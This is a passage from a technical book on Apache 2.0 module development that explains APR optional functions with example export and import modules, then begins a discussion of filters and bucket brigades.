 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
An optional function is pretty much what it sounds like. It is a function that may turn out, 
at runtime, not to be implemented (or not to exist at all, more to the point). So, there are 
five parts to an optional function: a declaration, an implementation, a registration, a 
retrieval, and a call. The export of the optional function declares it:  
APR_DECLARE_OPTIONAL_FN(int,some_fn,(const char *thing)) 
This is pretty much like a hook declaration: you have the return type, the name of the 
function, and the argument declaration. Like a hook declaration, it would normally 
appear in a header.  
Next it has to be implemented: 
int some_fn(const char *thing) 
{ 
    /* do stuff */ 
} 
Note that the function name must be the same as in the declaration. 
The next step is to register the function (note that optional functions are a bit like optional 
hooks in a distorting mirror — some parts switch role from the exporter of the function to 
the importer, and this is one of them):  

APR_REGISTER_OPTIONAL_FN(some_fn); 
Again, the function name must be the same as the declaration. This is normally called in 
the hook registration process.[5]  
Next, the user of the function must retrieve it. Because it is registered during hook 
registration, it can't be reliably retrieved at that point. However, there is a hook for 
retrieving optional functions (called, obviously enough, optional_fn_retrieve). Or it 
can be done by keeping a flag that says whether it has been retrieved and retrieving it 
when it is needed. (Although it is tempting to use the pointer to function as the flag, it is a 
bad idea — if it is not registered, then you will attempt to retrieve it every time instead of 
just once). In either case, the actual retrieval looks like this:  
APR_OPTIONAL_FN_TYPE(some_fn) *pfn; 
 
pfn=APR_RETRIEVE_OPTIONAL_FN(some_fn); 
From there on in, pfn gets used just like any other pointer to a function. Remember that it 
may be NULL, of course!  
20.8.5 Optional Function Example 
As with optional hooks, this example consists of three files which can be found in 
.../modules/experimental: mod_optional_fn_export.c, mod_optional_fn_export.h and 
mod_optional_fn_import.c. (Note that comments for this example follow the code line(s) 
to which they refer.)  
First the header, mod_optional_fn_export.h: 
#include "apr_optional.h" 
Get the optional function support from APR. 
APR_DECLARE_OPTIONAL_FN(int,TestOptionalFn,(const char *)); 
And declare our optional function, which really looks like int TestOptionalFn(const 
char *).  
Now the exporting file, mod_optional_fn_export.c: 
#include "httpd.h" 
#include "http_config.h" 
#include "http_log.h" 
#include "mod_optional_fn_export.h" 
As always, we start with the headers, including our own. 
static int TestOptionalFn(const char *szStr) 

{ 
    ap_log_error(APLOG_MARK,APLOG_ERR,OK,NULL, 
                 "Optional function test said: %s",szStr); 
 
    return OK; 
} 
This is the optional function — all it does is log the fact that it was called.  
static void ExportRegisterHooks(apr_pool_t *p) 
{ 
    APR_REGISTER_OPTIONAL_FN(TestOptionalFn); 
} 
During hook registration we register the optional function. 
module optional_fn_export_module= 
{ 
    STANDARD20_MODULE_STUFF, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    ExportRegisterHooks 
}; 
And finally, we see the module structure containing just the hook registration function.  
Now the module that uses the optional function, mod_optional_fn_import.c:  
#include "httpd.h" 
#include "http_config.h" 
#include "mod_optional_fn_export.h" 
#include "http_protocol.h" 
These are the headers. Of course, we have to include the header that declares the optional 
function.  
static APR_OPTIONAL_FN_TYPE(TestOptionalFn) *pfn; 
We declare a pointer to the optional function — note that the macro 
APR_OPTIONAL_FN_TYPE gets us the type of the function from its name.  
static int ImportLogTransaction(request_rec *r) 
{ 
    if(pfn) 
        return pfn(r->the_request); 
    return DECLINED; 
} 

Further down we will hook the log_transaction hook, and when it gets called we'll 
then call the optional function — but only if its present, of course!  
static void ImportFnRetrieve(void) 
{ 
    pfn=APR_RETRIEVE_OPTIONAL_FN(TestOptionalFn); 
} 
We retrieve the function here — this function is called by the optional_fn_retrieve 
hook (also registered later), which happens at the earliest possible moment after hook 
registration.  
static void ImportRegisterHooks(apr_pool_t *p) 
{ 
    
ap_hook_log_transaction(ImportLogTransaction,NULL,NULL,APR_HOOK_MIDDLE)
; 
    
ap_hook_optional_fn_retrieve(ImportFnRetrieve,NULL,NULL,APR_HOOK_MIDDLE
); 
} 
And here's where we register our hooks. 
module optional_fn_import_module = 
{ 
    STANDARD20_MODULE_STUFF, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    ImportRegisterHooks 
}; 
And, once more, the familiar module structure. 
20.9 Filters, Buckets, and Bucket Brigades 
A new feature of Apache 2.0 is the ability to create filters, as described in Chapter 6. 
These are modules (or parts of modules) that modify the output or input of other modules 
in some way. Over the course of Apache's development, it has often been said that these 
could only be done in a threaded server, because then you can make the process look just 
like reading and writing files. Early attempts to do it without threading met the argument 
that the required "inside out" model would be too hard for most module writers to handle. 
So, when Apache 2.0 came along with threading as a standard feature, there was much 
rejoicing. But wait! Unfortunately, even in 2.0, there are platforms that don't handle 
threading and process models that don't use it even if the platform supports it. So, we 
were back at square one. But, strangely, a new confidence in the ability of module writers 

meant that people suddenly believed that they could handle the "inside out" programming 
model.[6] And so, bucket brigades were born.  
The general concept is that each "layer" in the filter stack can talk to the next layer up (or 
down, depending on whether it is an input filter or an output filter) and deal with the I/O 
between them by handing up (or down) "bucket brigades," which are a list of "buckets." 
Each bucket can contain some data, which should be dealt with in order by the filter, 
which, in turn, generates new bucket brigades and buckets.  
Of course, there is an obvious asymmetry between input filters and output filters. Despite 
its obviousness, it takes a bit of getting used to when writing filters. An output filter is 
called with a bucket brigade and told "here, deal with the contents of this." In turn, it 
creates new bucket brigades and hands them on to the downstream filters. In contrast, an 
input filter gets asked "could you please fill this brigade?" and must, in turn, call lower-
level filters to seed the input.  
Of course, there are special cases for the ends of brigades — the "bottom" end will 
actually receive or send data (often through a special bucket) and the "top" end will 
consume or generate data without any higher (for output) or lower (for input) filter 
feeding it.  
Why do we have buckets and bucket brigades? Why not pass buckets between the filters 
